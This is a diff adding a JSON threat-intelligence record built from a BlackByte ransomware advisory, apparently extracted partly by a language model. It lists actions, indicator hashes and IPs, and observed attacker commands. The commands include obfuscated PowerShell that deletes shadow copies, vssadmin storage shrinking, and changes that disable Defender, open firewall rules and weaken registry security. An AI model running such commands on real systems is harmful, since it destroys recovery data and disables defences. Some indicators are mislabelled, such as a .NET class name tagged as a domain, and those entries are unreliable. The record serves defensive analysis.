@@ -1,0 +1,2402 @@
+{
+ "schema_version": "1.0",
+ "name": "csa-2022-220211",
+ "provenance": {
+  "input_kind": "markdown",
+  "input_sha256": "ba1fa7f32b95a0aaf5986696592633740a078776f27ff6d30a01c9d5ff4a8ccc",
+  "source_name": "csa-2022-220211"
+ },
+ "actions": [
+  {
+   "id": "a1",
+   "name": "gained access using a known Microsoft Exchange Server vulnerability",
+   "source": "llm",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-1"
+   ],
+   "epistemic_status": "supported",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  },
+  {
+   "id": "a2",
+   "name": "deployed tools to move laterally across the network and escalate privileges",
+   "source": "llm",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-2"
+   ],
+   "epistemic_status": "supported",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  },
+  {
+   "id": "a3",
+   "name": "exfiltrated and encrypted files",
+   "source": "llm",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-3"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "partial",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  },
+  {
+   "id": "a4",
+   "name": "left a ransom note in all directories where encryption occurs",
+   "source": "llm",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-4"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  },
+  {
+   "id": "a5",
+   "name": "ran executables from c:\\windows\\system32\\ and C:\\Windows\\",
+   "source": "llm",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  },
+  {
+   "id": "a6",
+   "name": "performed process injection on processes it creates",
+   "source": "llm",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-6"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  },
+  {
+   "id": "a7",
+   "name": "created scheduled tasks to launch ransomware and open ransom note",
+   "source": "llm",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-7"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "source_certainty": "hedged",
+   "epistemic_reason": "原文以不確定語氣陳述（如 may have／appears to／we believe），不是已確認的事實。",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  },
+  {
+   "id": "a8",
+   "name": "executed commands to stop services, disable services, and delete shadow copies",
+   "source": "llm",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-8",
+    "evidence-9",
+    "evidence-10",
+    "evidence-11"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  },
+  {
+   "id": "a9",
+   "name": "executed commands to modify firewall rules, registry settings, mount volumes, and query network and AD information",
+   "source": "llm",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-12"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "needs_vm",
+   "reproducibility_reason": "Requires Windows VM; Windows release and validated image are missing. Supply the release and lawful image reference; no version is assumed."
+  }
+ ],
+ "relations": [
+  {
+   "id": "r1",
+   "from_action": "a1",
+   "to_action": "a2",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "The wording gives the order of actions",
+   "evidence_refs": [
+    "evidence-2"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r2",
+   "from_action": "a2",
+   "to_action": "a3",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "The wording gives the order of actions",
+   "evidence_refs": [
+    "evidence-2"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r3",
+   "from_action": "a3",
+   "to_action": "a4",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "The ransom note is left in all directories where encryption occurs",
+   "evidence_refs": [
+    "evidence-4"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r4",
+   "from_action": "a5",
+   "to_action": "a6",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "Process injection observed on processes it creates implies injection follows running executables",
+   "evidence_refs": [
+    "evidence-13"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r5",
+   "from_action": "a7",
+   "to_action": "a5",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "narrative order only",
+   "evidence_refs": [],
+   "epistemic_status": "inferred"
+  },
+  {
+   "id": "r6",
+   "from_action": "a8",
+   "to_action": "a9",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "narrative order only",
+   "evidence_refs": [],
+   "epistemic_status": "inferred"
+  }
+ ],
+ "hosts": [
+  {
+   "id": "h1",
+   "role": "compromised host system",
+   "source": "llm",
+   "name": "Microsoft Exchange Server",
+   "os": "Windows",
+   "evidence_refs": [
+    "evidence-1",
+    "evidence-14"
+   ],
+   "epistemic_status": "supported",
+   "service_refs": [
+    "s1"
+   ]
+  },
+  {
+   "id": "h2",
+   "role": "compromised physical and virtual servers",
+   "source": "llm",
+   "name": "Windows host systems",
+   "os": "Windows",
+   "evidence_refs": [
+    "evidence-15",
+    "evidence-13"
+   ],
+   "epistemic_status": "supported",
+   "service_refs": []
+  }
+ ],
+ "services": [
+  {
+   "id": "s1",
+   "name": "Microsoft Exchange Server",
+   "source": "llm",
+   "host_ref": "h1",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient",
+   "no_component": true,
+   "is_substitute": false,
+   "tier": "unavailable",
+   "version_basis": "assumed",
+   "reproduces_cve": [],
+   "not_reproducible": true,
+   "not_reproducible_reason": "Microsoft Exchange Server is not in the inventory and no substitute matches; not reproducible."
+  }
+ ],
+ "target_context": {
+  "host_refs": [
+   "h1",
+   "h2"
+  ],
+  "service_refs": [
+   "s1"
+  ]
+ },
+ "artifacts": [
+  {
+   "name": "complex.exe",
+   "type": "file",
+   "id": "art1",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-16"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "BlackByteRestore.txt",
+   "type": "file",
+   "id": "art2",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-17"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "tree.dll",
+   "type": "file",
+   "id": "art3",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-18"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "scheduled tasks",
+   "type": "other",
+   "id": "art4",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-19"
+   ],
+   "epistemic_status": "supported"
+  }
+ ],
+ "indicators": [
+  {
+   "id": "indicator-1",
+   "type": "ip",
+   "value": "185.93.6.31",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-20"
+   ]
+  },
+  {
+   "id": "indicator-2",
+   "type": "ip",
+   "value": "45.9.148.114",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-21"
+   ]
+  },
+  {
+   "id": "indicator-3",
+   "type": "domain",
+   "value": "www.us-cert.gov",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-22"
+   ]
+  },
+  {
+   "id": "indicator-4",
+   "type": "hash",
+   "value": "4d2da36174633565f3dd5ed6dc5033c4",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-23"
+   ]
+  },
+  {
+   "id": "indicator-5",
+   "type": "hash",
+   "value": "959a7df5c465fcd963a641d87c18a565",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-24"
+   ]
+  },
+  {
+   "id": "indicator-6",
+   "type": "hash",
+   "value": "cd7034692d8f29f9146deb3641de7986",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-25"
+   ]
+  },
+  {
+   "id": "indicator-7",
+   "type": "hash",
+   "value": "5f40e1859053b70df9c0753d327f2cee",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-26"
+   ]
+  },
+  {
+   "id": "indicator-8",
+   "type": "hash",
+   "value": "d63a7756bfdcd2be6c755bf288a92c8b",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-27"
+   ]
+  },
+  {
+   "id": "indicator-9",
+   "type": "hash",
+   "value": "df7befc8cdc3c5434ef27cc669fb1e4b",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-28"
+   ]
+  },
+  {
+   "id": "indicator-10",
+   "type": "hash",
+   "value": "eed7357ab8d2fe31ea3dbcf3f9b7ec74",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-29"
+   ]
+  },
+  {
+   "id": "indicator-11",
+   "type": "hash",
+   "value": "51f2cf541f004d3c1fa8b0f94c89914a",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-30"
+   ]
+  },
+  {
+   "id": "indicator-12",
+   "type": "hash",
+   "value": "695e343b81a7b0208cbae33e11f7044c",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-31"
+   ]
+  },
+  {
+   "id": "indicator-13",
+   "type": "hash",
+   "value": "d9e94f076d175ace80f211ea298fa46e",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-32"
+   ]
+  },
+  {
+   "id": "indicator-14",
+   "type": "hash",
+   "value": "296c51eb03e70808304b5f0e050f4f94",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-33"
+   ]
+  },
+  {
+   "id": "indicator-15",
+   "type": "hash",
+   "value": "8320d9ec2eab7f5ff49186b2e630a15f",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-34"
+   ]
+  },
+  {
+   "id": "indicator-16",
+   "type": "hash",
+   "value": "0c7b8da133799dd72d0dbe3ea012031e",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-35"
+   ]
+  },
+  {
+   "id": "indicator-17",
+   "type": "hash",
+   "value": "cea6be26d81a8ff3db0d9da666cd0f8f",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-36"
+   ]
+  },
+  {
+   "id": "indicator-18",
+   "type": "hash",
+   "value": "a77899602387665cddb6a0f021184a2b",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-37"
+   ]
+  },
+  {
+   "id": "indicator-19",
+   "type": "hash",
+   "value": "31f818372fa07d1fd158c91510b6a077",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-38"
+   ]
+  },
+  {
+   "id": "indicator-20",
+   "type": "hash",
+   "value": "1473c91e9c0588f92928bed0ebf5e0f4",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-39"
+   ]
+  },
+  {
+   "id": "indicator-21",
+   "type": "hash",
+   "value": "28b791746c97c0c04dcbfe0954e7173b",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-40"
+   ]
+  },
+  {
+   "id": "indicator-22",
+   "type": "hash",
+   "value": "a9cf6dce244ad9afd8ca92820b9c11b9",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-41"
+   ]
+  },
+  {
+   "id": "indicator-23",
+   "type": "hash",
+   "value": "52b8ae74406e2f52fd81c8458647acd8",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-42"
+   ]
+  },
+  {
+   "id": "indicator-24",
+   "type": "hash",
+   "value": "7139415fecd716bec6d38d2004176f5d",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-43"
+   ]
+  },
+  {
+   "id": "indicator-25",
+   "type": "hash",
+   "value": "1785f4058c78ae3dd030808212ae3b04",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-44"
+   ]
+  },
+  {
+   "id": "indicator-26",
+   "type": "hash",
+   "value": "c13bf39e2f8bf49c9754de7fb1396a33",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-45"
+   ]
+  },
+  {
+   "id": "indicator-27",
+   "type": "hash",
+   "value": "b8e24e6436f6bed17757d011780e87b9",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-46"
+   ]
+  },
+  {
+   "id": "indicator-28",
+   "type": "hash",
+   "value": "5c0a549ae45d9abe54ab662e53c484e2",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-47"
+   ]
+  },
+  {
+   "id": "indicator-29",
+   "type": "hash",
+   "value": "8dfa48e56fc3a6a2272771e708cdb4d2",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-48"
+   ]
+  },
+  {
+   "id": "indicator-30",
+   "type": "hash",
+   "value": "ad29212716d0b074d976ad7e33b8f35f",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-49"
+   ]
+  },
+  {
+   "id": "indicator-31",
+   "type": "hash",
+   "value": "4ce0bdd2d4303bf77611b8b34c7d2883",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-50"
+   ]
+  },
+  {
+   "id": "indicator-32",
+   "type": "hash",
+   "value": "d4aa276a7fbe8dcd858174eeacbb26ce",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-51"
+   ]
+  },
+  {
+   "id": "indicator-33",
+   "type": "hash",
+   "value": "c010d1326689b95a3d8106f75003427c",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-52"
+   ]
+  },
+  {
+   "id": "indicator-34",
+   "type": "hash",
+   "value": "9344afc63753cd5e2ee0ff9aed43dc56",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-53"
+   ]
+  },
+  {
+   "id": "indicator-35",
+   "type": "hash",
+   "value": "ae6fbc60ba9c0f3a0fef72aeffcd3dc7",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-54"
+   ]
+  },
+  {
+   "id": "indicator-36",
+   "type": "hash",
+   "value": "e2eb5b57a8765856be897b4f6dadca18",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-55"
+   ]
+  },
+  {
+   "id": "indicator-37",
+   "type": "hash",
+   "value": "405cb8b1e55bb2a50f2ef3e7c2b28496",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-56"
+   ]
+  },
+  {
+   "id": "indicator-38",
+   "type": "hash",
+   "value": "58e8043876f2f302fbc98d00c270778b",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-57"
+   ]
+  },
+  {
+   "id": "indicator-39",
+   "type": "hash",
+   "value": "11e35160fc4efabd0a3bd7a7c6afc91b",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-58"
+   ]
+  },
+  {
+   "id": "indicator-40",
+   "type": "hash",
+   "value": "d2a15e76a4bfa7eb007a07fc8738edfb",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-59"
+   ]
+  },
+  {
+   "id": "indicator-41",
+   "type": "hash",
+   "value": "659b77f88288b4874b5abe41ed36380d",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-60"
+   ]
+  },
+  {
+   "id": "indicator-42",
+   "type": "hash",
+   "value": "e46bfbdf1031ea5a383040d0aa598d45",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-61"
+   ]
+  },
+  {
+   "id": "indicator-43",
+   "type": "hash",
+   "value": "151c6f04aeff0e00c54929f25328f6f7",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-62"
+   ]
+  },
+  {
+   "id": "indicator-44",
+   "type": "domain",
+   "value": "System.Text.Encoding",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-63"
+   ]
+  },
+  {
+   "id": "indicator-45",
+   "type": "domain",
+   "value": "www.stopransomware.gov",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-64"
+   ]
+  }
+ ],
+ "commands": [
+  {
+   "id": "command-1",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c for /l %x in (1,1,75) do start wordpad.exe /p C:\\Users\\tree.dll. This command attempts to open tree.dll in wordpad 75 times and then prints the contents",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-65"
+   ]
+  },
+  {
+   "id": "command-2",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c powershell -command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA' +'G4ARAB'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x\" schtasks.exe /DELETE /TN \"\\\"Raccine Rules Updater\\\"\" /F",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-66"
+   ]
+  },
+  {
+   "id": "command-3",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-67"
+   ]
+  },
+  {
+   "id": "command-4",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-68"
+   ]
+  },
+  {
+   "id": "command-5",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-69"
+   ]
+  },
+  {
+   "id": "command-6",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-70"
+   ]
+  },
+  {
+   "id": "command-7",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-71"
+   ]
+  },
+  {
+   "id": "command-8",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-72"
+   ]
+  },
+  {
+   "id": "command-9",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-73"
+   ]
+  },
+  {
+   "id": "command-10",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-74"
+   ]
+  },
+  {
+   "id": "command-11",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-75"
+   ]
+  },
+  {
+   "id": "command-12",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-76"
+   ]
+  },
+  {
+   "id": "command-13",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-77"
+   ]
+  },
+  {
+   "id": "command-14",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-78"
+   ]
+  },
+  {
+   "id": "command-15",
+   "interpreter": "powershell",
+   "command": "powershell.exe $x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x sc.exe config SQLTELEMETRY start= disabled sc.exe config SQLTELEMETRY$ECWDB2 start= disabled sc.exe config SQLWriter start= disabled sc.exe config SstpSvc start= disabled",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-79"
+   ]
+  },
+  {
+   "id": "command-16",
+   "interpreter": "powershell",
+   "command": "powershell.exe Set-MpPreference -EnableControlledFolderAccess Disabled sc.exe config MBAMService start= disabled sc.exe config wuauserv start= disabled sc.exe config Dnscache start= auto sc.exe config fdPHost start= auto sc.exe config FDResPub start= auto sc.exe config SSDPSRV start= auto sc.exe config upnphost start= auto sc.exe config RemoteRegistry start= auto",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-80"
+   ]
+  },
+  {
+   "id": "command-17",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\"\" new enable=Yes",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-81"
+   ]
+  },
+  {
+   "id": "command-18",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\"\" new enable=Yes",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-82"
+   ]
+  },
+  {
+   "id": "command-19",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-83"
+   ]
+  },
+  {
+   "id": "command-20",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-84"
+   ]
+  },
+  {
+   "id": "command-21",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f mountvol.exe A: \\\\?\\Volume{d7e47829-0000-0000-0000-100000000000}\\ mountvol.exe B: \\\\?\\Volume{d7e47829-0000-0000-0000-b0e213000000}\\ mountvol.exe E: \\\\?\\Volume{fce79ce0-b01f-11e6-b968-806e6f6e6963}\\",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-85"
+   ]
+  },
+  {
+   "id": "command-22",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del C:\\Users\\REM\\Desktop\\hybrid-9-8\\complex.exe",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-86"
+   ]
+  },
+  {
+   "id": "command-23",
+   "interpreter": "powershell",
+   "command": "powershell.exe $x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-87"
+   ]
+  },
+  {
+   "id": "command-24",
+   "interpreter": "cmd",
+   "command": "cmd.exe /c powershell -command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x\"",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-88"
+   ]
+  }
+ ],
+ "evidence": [
+  {
+   "id": "evidence-1",
+   "quote": "Some victims reported the actors used a known Microsoft Exchange Server vulnerability as a means of gaining access to their networks.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Some victims reported the actors used a known Microsoft Exchange Server vulnerability as a means of gaining access to their networks."
+  },
+  {
+   "id": "evidence-2",
+   "quote": "Once in, actors deploy tools to move laterally across the network and escalate privileges before exfiltrating and encrypting files.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Once in, actors deploy tools to move laterally across the network and escalate privileges before exfiltrating and encrypting files."
+  },
+  {
+   "id": "evidence-3",
+   "quote": "Once in, actors deploy tools to move laterally across the network and escalate privileges before exfiltrating and encrypting files. In some instances, BlackByte ransomware actors have only partially encrypted files.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Once in, actors deploy tools to move laterally across the network and escalate privileges before exfiltrating and encrypting files. In some instances, BlackByte"
+  },
+  {
+   "id": "evidence-4",
+   "quote": "The BlackByte executable leaves a ransom note in all directories where encryption occurs.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The BlackByte executable leaves a ransom note in all directories where encryption occurs."
+  },
+  {
+   "id": "evidence-5",
+   "quote": "BlackByte ransomware runs executables from c:\\windows\\system32\\ and C:\\Windows\\.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "BlackByte ransomware runs executables from c:\\windows\\system32\\ and C:\\Windows\\."
+  },
+  {
+   "id": "evidence-6",
+   "quote": "Process injection has been observed on processes it creates.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Process injection has been observed on processes it creates."
+  },
+  {
+   "id": "evidence-7",
+   "quote": "Scheduled tasks may be created and artifacts have been observed at Windows\\System32\\Tasks: C:\\Users\\<username>\\complex.exe -single <SHA256>. This command appears to launch the ransomware. C:\\Windows\\System32\\cmd.exe /c for /l %x in (1,1,75) do start wordpad.exe /p C:\\Users\\tree.dll. This command attempts to open tree.dll in wordpad 75 times and then prints the contents.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Scheduled tasks may be created and artifacts have been observed at\n       Windows\\System32\\Tasks:\n        C:\\Users\\<username>\\complex.exe -single <SHA256>.\n    "
+  },
+  {
+   "id": "evidence-8",
